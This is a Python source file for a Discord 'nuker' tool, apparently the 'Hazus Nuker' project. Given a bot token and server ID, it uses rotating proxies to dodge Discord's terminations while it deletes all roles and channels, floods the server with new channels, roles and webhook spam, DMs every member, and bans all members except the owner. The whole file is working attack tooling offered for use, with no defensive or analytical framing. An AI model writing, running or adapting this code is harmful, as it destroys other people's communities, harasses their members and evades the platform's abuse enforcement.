import requests
import colorama
from concurrent.futures import ThreadPoolExecutor, as_completed
import random
import time
import json

def get_proxies():
    with open("proxies.txt", 'r') as file:
        proxies = []
        for line in file:
            stripped_line = line.strip()
            if not stripped_line.startswith('#'):
                proxies.append(stripped_line)
        return proxies

def delete_channel(token, proxy, channelid, proxylist, timeslooped, send_errors):
    try:
        response = requests.delete(f"https://discord.com/api/v9/channels/{channelid}", proxies={"http": proxy, "https": proxy}, headers={'Authorization': f'Bot {token}'}, timeout=1.5)
        if response.status_code == 200 or response.status_code == 204:
            print(colorama.Fore.RESET + f"Deleted Channel {channelid}")
            return
        else:
            if timeslooped > 10:
                return
            else:
                print(colorama.Fore.RED + f"Bot is being rate limited, trying again in 1 second.")
                time.sleep(1)
                timeslooped += 1
                delete_channel(token, proxy, channelid, proxylist, timeslooped, send_errors)
    except Exception as e:
        if send_errors.lower().strip() == "y":
            print(colorama.Fore.RED + f"Error: {e} with proxy {proxy}. Trying with a different one.")
        proxylist.remove(proxy)
        if not proxylist:
            print(colorama.Fore.RED + "ERROR: ALL PROXIES HAVE FAILED!")
        else:
            proxy = random.choice(proxylist)
            delete_channel(token, proxy, channelid, proxylist, timeslooped, send_errors)

def delete_role(token, proxy, roleid, guildid, proxylist, send_errors):
    timeslooped = 0
    while timeslooped < 2:
        try:
            response = requests.delete(f"https://discord.com/api/v9/guilds/{guildid}/roles/{roleid}", proxies={"http": proxy, "https": proxy}, headers={'Authorization': f'Bot {token}'}, timeout=3)
            if response.status_code == 200 or response.status_code == 204:
                print(colorama.Fore.RESET + f"Deleted Role {roleid}")
                break
            else:
                print(colorama.Fore.RED + f"Bot is being rate limited, trying again in 1 second.")
                time.sleep(1)
                timeslooped += 1
        except Exception as e:
            if send_errors.lower().strip() == "y":
                print(colorama.Fore.RED + f"Error: {e} with proxy {proxy}. Trying with a different one.")
            proxylist.remove(proxy)
            if not proxylist:
                print(colorama.Fore.RED + "ERROR: ALL PROXIES HAVE FAILED!")
            else:
                proxy = random.choice(proxylist)

def create_channel(token, proxy, guildid, channel_names, proxylist, send_errors):
    try:
        response = requests.post(f"https://discord.com/api/v9/guilds/{guildid}/channels", proxies={"http": proxy, "https": proxy}, headers={'Authorization': f'Bot {token}','Content-Type': 'application/json'}, json={'name': f'{channel_names}','type': 0}, timeout=1.5)
        if response.status_code == 200 or response.status_code == 204 or response.status_code == 201:
            print(colorama.Fore.RESET + f"Created Channel: {channel_names}")
            return
        else:
            print(colorama.Fore.RED + f"Bot is being rate limited, trying again in 1 second.")
            time.sleep(1)
            create_channel(token, proxy, guildid, channel_names, proxylist, send_errors)
    except Exception as e:
        if send_errors.lower().strip() == "y":
                print(colorama.Fore.RED + f"Error: {e} with proxy {proxy}. Trying with a different one.")
        proxylist.remove(proxy)
        if not proxylist:
            print(colorama.Fore.RED + "ERROR: ALL PROXIES HAVE FAILED!")
        else:
            proxy = random.choice(proxylist)
            create_channel(token, proxy, guildid, channel_names, proxylist, send_errors)

def post_to_webhook(proxy, webhook, spam_message, send_errors, proxylist):
    try:
        response = requests.post(webhook, proxies={"http": proxy, "https": proxy}, json={"content": spam_message,"username": "Hazus Nuker"}, headers={"Content-Type": "application/json"}, timeout=4)
        if response.status_code == 204:
            print(colorama.Fore.GREEN + "Sent message to webhook.")
            return
        else:
            print(colorama.Fore.RED + f"Webhook {webhook} is being rate limited.")
    except Exception as e:
        if send_errors.lower().strip() == "y":
                print(colorama.Fore.RED + f"Error: {e} with proxy {proxy}. Trying with a different one.")
        proxylist.remove(proxy)
        if not proxylist:
            print(colorama.Fore.RED + "ERROR: ALL PROXIES HAVE FAILED!")
        else:
            proxy = random.choice(proxylist)
            post_to_webhook(proxy, webhook, spam_message, send_errors, proxylist)

def spam_channel(token, spam_message, channelid, looptimes, proxy, proxylist, max_threads, send_errors):
    while True:
        if not proxylist:
            print(colorama.Fore.RED + "ERROR: ALL PROXIES HAVE FAILED!")
        else:
            try:
                response = requests.post(f"https://discord.com/api/v9/channels/{channelid}/webhooks", proxies={"http": proxy, "https": proxy}, headers={'Authorization': f'Bot {token}','Content-Type': 'application/json'}, json={'name': "Hazus Nuker",}, timeout=1.5)
                if response.ok:
                    print(colorama.Fore.RESET + f"Created Webhook in channel {channelid}")
                    webhook_url = response.json()["url"]
                    
                    with ThreadPoolExecutor(max_workers=max_threads) as executor:
                        futures = []
                        for _ in range(looptimes):
                            futures.append(executor.submit(post_to_webhook, proxy, webhook_url, spam_message, send_errors, proxylist))
                    break
                else:
                    print(response.json())
                    print(colorama.Fore.RED + f"Bot is being rate limited, trying again in 1 second.")
                    time.sleep(1)
            except Exception as e:
                if send_errors.lower().strip() == "y":
                    print(colorama.Fore.RED + f"Error: {e} with proxy {proxy}. Trying with a different one.")
                proxylist.remove(proxy)
                if not proxylist:
                    print(colorama.Fore.RED + "ERROR: ALL PROXIES HAVE FAILED!")
                else:
                    proxy = random.choice(proxylist)
    print(f"Finished {channelid}")
    return

def create_role(token, proxy, guildid, role, proxylist, send_errors):
    if not proxylist:
            print(colorama.Fore.RED + "ERROR: ALL PROXIES HAVE FAILED!")
    try:
        response = requests.post(f"https://discord.com/api/v9/guilds/{guildid}/roles", proxies={"http": proxy, "https": proxy}, headers={'Authorization': f'Bot {token}','Content-Type': 'application/json'}, json={'name': f'{role}','type': 0}, timeout=1.5)
        if response.status_code == 200 or response.status_code == 204 or response.status_code == 201:
            print(colorama.Fore.RESET + f"Created Role: {role}")
            return
        else:
            print(colorama.Fore.RED + f"Bot is being rate limited, trying again in 1 second.")
            time.sleep(1)
            create_role(token, proxy, guildid, role, proxylist, send_errors)
    except Exception as e:
        if send_errors.lower().strip() == "y":
                print(colorama.Fore.RED + f"Error: {e} with proxy {proxy}. Trying with a different one.")
        proxylist.remove(proxy)
        if not proxylist:
            print(colorama.Fore.RED + "ERROR: ALL PROXIES HAVE FAILED!")
        else:
            proxy = random.choice(proxylist)
            create_role(token, proxy, guildid, role, proxylist, send_errors)

def dm_member(dm_message, token, proxy, member, proxylist, send_errors):
    try:
        response = requests.post(f"https://discord.com/api/v9/users/@me/channels", proxies={"http": proxy, "https": proxy}, headers={'Authorization': f'Bot {token}','Content-Type': 'application/json',}, json={'recipient_id': member['user']['id']}, timeout=3)
        if response.status_code == 200 or response.status_code == 204:
            channel_id = response.json()['id']
            response = requests.post(f"https://discord.com/api/v9/channels/{channel_id}/messages", proxies={"http": proxy, "https": proxy}, headers={'Authorization': f'Bot {token}','Content-Type': 'application/json',}, json={'content': dm_message}, timeout=3)
            if response.status_code == 200 or response.status_code == 204:
                print(colorama.Fore.RESET + f"Sent DM to {member['user']['id']}")
                return
            else:
                print(colorama.Fore.RED + f"Bot is being rate limited, trying again in 1 second.")
                time.sleep(1)
                dm_member(dm_message, token, proxy, member, proxylist, send_errors)
        else:
            print(colorama.Fore.RED + f"Bot is being rate limited, trying again in 1 second.")
            time.sleep(1)
            dm_member(dm_message, token, proxy, member, proxylist, send_errors)
    except Exception as e:
        if send_errors.lower().strip() == "y":
                print(colorama.Fore.RED + f"Error: {e} with proxy {proxy}. Trying with a different one.")
        proxylist.remove(proxy)
        if not proxylist:
            print(colorama.Fore.RED + "ERROR: ALL PROXIES HAVE FAILED!")
        else:
            proxy = random.choice(proxylist)
            dm_member(dm_message, token, proxy, member, proxylist, send_errors)

def ban_member(token, proxy, guildid, member, proxylist, send_errors):
    try:
        response = requests.put(f"https://discord.com/api/v9/guilds/{guildid}/bans/{member}", proxies={"http": proxy, "https": proxy}, headers={'Authorization': f'Bot {token}','Content-Type': 'application/json',},json={'reason': 'HAZUS NUKER | https://github.com/FlashGriefs/Hazus/'}, timeout=3)
        if response.status_code == 200 or response.status_code == 204:
            print(colorama.Fore.RESET + f"Banned {member}")
            return
        else:
            print(colorama.Fore.RED + f"Bot is being rate limited, trying again in 1 second.")
            time.sleep(1)
            ban_member(token, proxy, guildid, member, proxylist, send_errors)
    except Exception as e:
        print(colorama.Fore.RED + f"Error: {e} with proxy {proxy}. Trying with a different one.")
        proxylist.remove(proxy)
        if not proxylist:
            print(colorama.Fore.RED + "ERROR: ALL PROXIES HAVE FAILED!")
        else:
            proxy = random.choice(proxylist)
            ban_member(token, proxy, guildid, member, proxylist, send_errors)

def bot_nuker_helper():
    print(colorama.Fore.RED + "To prevent discord terminations it is not optional to use proxies for bot nuker. You can google ""free proxies"" to get free proxies.")
    proxylist = get_proxies()
    if not proxylist:
        print(colorama.Fore.RED + "ERROR: NO PROXIES IN PROXIES.TXT")
    token = input(colorama.Fore.RESET + "Token: ")
    response = requests.get("https://discord.com/api/v9/users/@me", headers={"Authorization": f"Bot {token}"})
    if response.status_code != 200:
        print(colorama.Fore.RED + "Invalid Token.\n")
        return
    else:
        botid = response.json()['id']    
    guildid = input("Discord Server ID: ")
    number_of_roles = int(input("Number of roles to create: "))
    role_names = input("Name of roles to create: ")
    number_of_channels = int(input("Number of channels to create: "))
    channel_names = input("Name of channels to create: ")
    number_of_messages = int(input("Number of times to send message in each channel: "))
    spam_message = input("Message to spam: ")
    dm_members = input("DM all members? (Y/N): ")
    if dm_members.lower().strip() == "y":
        dm_message = input("Message to DM members: ")
    ban_members = input("Ban all members? (Y/N): ")
    max_threads = int(input("Max Threads (more threads = faster but harder on pc): "))
    send_errors = input("Print Proxy Errors To Terminal? (This will spam your terminal if you're using free/low quality proxies) (Y/N): ")

    response = requests.get(f"https://discord.com/api/v9/guilds/{guildid}/members/{botid}", headers={'Authorization': f'Bot {token}'})
    bot_roles = response.json().get('roles', [])

    response = requests.get(f"https://discord.com/api/v9/guilds/{guildid}/roles", headers={'Authorization': f'Bot {token}'})
    roles = response.json()

    highest_position = 0
    for role in roles:
        if role['id'] in bot_roles and role['position'] > highest_position:
            highest_position = role['position']
    roles_without_everyone = [role for role in roles if role['name'] != '@everyone']
    print(colorama.Fore.RESET + "Deleting roles...")
    with ThreadPoolExecutor(max_workers=max_threads) as executor:
        futures = []
        for roleid in roles_without_everyone:
            proxy = random.choice(proxylist)
            futures.append(executor.submit(delete_role, token, proxy, roleid['id'], guildid, proxylist, send_errors))

    response = requests.get(f"https://discord.com/api/v9/guilds/{guildid}/channels", headers={'Authorization': f'Bot {token}'})
    channels = response.json()

    channellist = ""
    channelcount = 0
    for channel in channels:
        channel = channel['id']
        channellist = f"{channellist}\n{channel}"
        channelcount += 1
    print (str(channelcount) + "\n")
    print (channellist)

    print(colorama.Fore.RESET + "Deleting channels...")
    with ThreadPoolExecutor(max_workers=max_threads) as executor:
        futures = []
        for channel in channels:
            proxy = random.choice(proxylist)
            futures.append(executor.submit(delete_channel, token, proxy, channel['id'], proxylist, 1, send_errors))

    print(colorama.Fore.RESET + "Creating channels...")
    with ThreadPoolExecutor(max_workers=max_threads) as executor:
        futures = []
        for i in range(number_of_channels):
            proxy = random.choice(proxylist)
            futures.append(executor.submit(create_channel, token, proxy, guildid, channel_names, proxylist, send_errors))
        
    response = requests.get(f"https://discord.com/api/v9/guilds/{guildid}/channels", headers={'Authorization': f'Bot {token}'})
    channels = response.json()
    print(colorama.Fore.RESET + "Creating webhooks & spamming channels...")
    with ThreadPoolExecutor(max_workers=max_threads) as executor:
        futures = []
        for channel in channels:
            proxy = random.choice(proxylist)
            futures.append(executor.submit(spam_channel, token, spam_message, channel['id'], number_of_messages, proxy, proxylist, max_threads, send_errors))

    print(colorama.Fore.RESET + "Creating roles...")
    with ThreadPoolExecutor(max_workers=max_threads) as executor:
        futures = []
        for i in range(number_of_roles):
            proxy = random.choice(proxylist)
            futures.append(executor.submit(create_role, token, proxy, guildid, role_names, proxylist, send_errors))

    if dm_members.lower().strip() == "y":
        response = requests.get(f"https://discord.com/api/v9/guilds/{guildid}/members", headers={'Authorization': f'Bot {token}'}, params={'limit': 1000})
        members = response.json()
        print(colorama.Fore.RESET + "Dming members...")
        with ThreadPoolExecutor(max_workers=max_threads) as executor:
            futures = []
            for member in members:
                if member['user']['id'] != botid:
                    proxy = random.choice(proxylist)
                    futures.append(executor.submit(dm_member, dm_message, token, proxy, member, proxylist, send_errors))

    if ban_members.lower().strip() == "y":
        response = requests.get(f"https://discord.com/api/v9/guilds/{guildid}", headers={'Authorization': f'Bot {token}'})
        server_owner = response.json()['owner_id']
        response = requests.get(f"https://discord.com/api/v9/guilds/{guildid}/members", headers={'Authorization': f'Bot {token}'}, params={'limit': 1000})
        members = response.json()
        print(colorama.Fore.RESET + "Banning members...")
        with ThreadPoolExecutor(max_workers=max_threads) as executor:
            futures = []
            for member in members:
                if member['user']['id'] != botid and member['user']['id'] != server_owner:
                    proxy = random.choice(proxylist)
                    futures.append(executor.submit(ban_member, token, proxy, guildid, member['user']['id'], proxylist, send_errors))

    return